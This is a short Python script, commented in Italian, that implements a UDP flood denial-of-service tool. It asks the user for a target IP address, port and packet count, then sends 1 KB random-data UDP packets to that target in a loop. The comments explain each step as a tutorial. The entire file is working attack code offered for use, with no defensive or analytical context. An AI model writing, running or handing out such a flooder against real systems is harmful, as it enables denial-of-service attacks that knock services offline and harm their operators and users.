#importazione dei moduli
import random # crea dei pacchetti casuali da inviare
import socket 
# libreria fondamentale per tutti gli script che riguardano le connessioni 
#  creano punti di connessione tra il programma e la rete


# definizione della funzione principale
def UDP_flood():
    dati_da_inviare = random._urandom(1024)
    # crea una variabile di pacchetti da 1KB da 'sparare' al ip target
    for x in range(numero_pacchetti):
        # inizia un ciclo che si ripeterà per inviare pacchetti
        # (10 20 o quelli che si vuole)
        s.sendto(dati_da_inviare , target)
        # questo è il comando che invia i pacchetti al IP bersaglio
        print( "#" ,x, "- UDP inviato\n" )
        

indirizzo_ip = str(input("Inserisci l' indirizzo IP target: "))
# definiamo l'IP input come stringa e lo chiediamo all' utente
porta = int(input("Inserisci la porta"))
# questo può essere solo un numero intero quindi lo definiamo come int 
# e lo chiediamo
numero_pacchetti = int(input("Inserisci il numero di pacchetti da inviare: "))
# chiediamo il numero di pacchetti che inviamo al ciclo for

# try excetp: prova a eseguire queste istruzioni (try)
#  se non puoi fai questo (except)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # fondamentale: crea il socket, af_inet dice al programma che quello è un 
    # IPv4, sock_dgram che il protocollo usato è UDP
    target = (str(indirizzo_ip), int(porta))
    # definiamo o 'miriamo' il bersaglio composto da IP e porta 

except:
    s.close()
    print("[!] Error!!!")
    # se si verifica un' errore durante la connessione o la creazione di
    # pacchetti il questa parte del programma ha il compito di chiudere
    #  la connsessione in modo sicuro e stampa un messaggio di errore

UDP_flood()
# chiama la funzione che abbiamo definito e avvia il processo.